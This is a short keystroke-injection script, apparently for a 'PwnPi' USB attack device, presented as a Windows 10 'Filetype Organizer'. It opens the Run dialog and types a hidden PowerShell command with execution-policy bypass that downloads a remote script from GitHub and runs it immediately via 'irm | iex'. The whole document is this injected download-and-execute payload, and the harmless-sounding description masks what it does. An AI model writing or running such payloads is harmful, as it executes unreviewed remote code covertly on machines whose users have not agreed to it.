// Title: Filetype Organizer
// Author: @beigeworm
// Description: This script searches the users folder for any files with a specific filetype and copies them to the user folder.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C cd $env:USERPROFILE; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Filetype-Organizer/main.ps1 | iex");
delay(500);
press("ENTER");
